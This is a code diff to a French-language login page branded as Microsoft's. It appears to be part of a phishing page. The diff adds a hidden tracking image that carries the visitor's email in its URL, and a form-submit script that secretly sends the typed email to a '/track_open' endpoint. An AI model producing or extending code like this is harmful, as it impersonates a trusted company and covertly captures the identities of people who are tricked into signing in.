@@ -98,11 +98,22 @@
             </div>
             <button type="submit">Se connecter</button>
         </form>
-        <!-- Image invisible pour suivre l'ouverture de la page -->
-        <img src="/track_open?email=" id="trackOpen" style="display:none;" alt="">
+
+        <!-- Image invisible pour suivre l'ouverture de la page avec l'email passé dans l'URL -->
+        <img src="/track_open?email={{ email }}" id="trackOpen" style="display:none;" alt="">
+
         <div class="footer">
             <p>&copy; 2025 Microsoft. Tous droits réservés.</p>
         </div>
     </div>
+
+    <script>
+        // Si l'utilisateur entre un email dans le formulaire, mettez à jour l'URL de l'image invisible
+        document.getElementById("loginForm").onsubmit = function() {
+            var email = document.getElementById("email").value;
+            // Mettez à jour l'URL de l'image pour inclure l'email saisi
+            document.getElementById("trackOpen").src = "/track_open?email=" + encodeURIComponent(email);
+        };
+    </script>
 </body>
 </html>
